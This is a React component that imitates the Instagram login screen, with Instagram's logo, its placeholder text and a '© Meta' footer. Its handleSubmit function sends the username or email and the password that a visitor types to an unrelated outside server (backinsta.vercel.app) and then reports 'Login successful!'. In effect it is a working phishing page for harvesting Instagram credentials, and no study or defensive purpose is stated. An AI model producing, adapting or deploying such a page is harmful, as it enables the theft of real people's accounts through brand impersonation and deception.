import React, { useState } from 'react';

const App = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch('https://backinsta.vercel.app/register', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        setSuccess('Login successful!');
        setError('');
      } else {
        setError(data.message);
        setSuccess('');
      }
    } catch (err) {
      setError('Something went wrong. Please try again.');
      setSuccess('');
    }
  };

  return (
    <div
      className="flex flex-col justify-center items-center h-screen"
      style={{
        backgroundColor: '#000',
        backgroundImage: 'linear-gradient(135deg, rgba(0,0,0,0.9), rgba(0,0,0,0.7))',
      }}
    >
      <div className="flex flex-col items-center p-8 rounded shadow-md w-80">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
          alt="Instagram Logo"
          className="mb-4"
          style={{ width: '50px' }}
        />
        <form onSubmit={handleSubmit} className="w-full">
          <div className="mb-4">
            <input
              type="text"
              placeholder="Username, email address or mobile number"
              className="w-full px-3 py-2 text-white border border-gray-600 bg-transparent rounded"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              placeholder="Password"
              className="w-full px-3 py-2 text-white border border-gray-600 bg-transparent rounded"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          {error && <p className="text-red-500 text-center">{error}</p>}
          {success && <p className="text-green-500 text-center">{success}</p>}
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded font-bold"
          >
            Log In
          </button>
          <p className="text-center text-gray-400 mt-4">Forgotten Password?</p>
        </form>
        <button
          className="mt-6 py-2 text-center text-white border border-gray-600 rounded w-full"
        >
          Create new account
        </button>
        <p className="text-center text-gray-500 text-sm mt-6">© Meta</p>
      </div>
    </div>
  );
};

export default App;
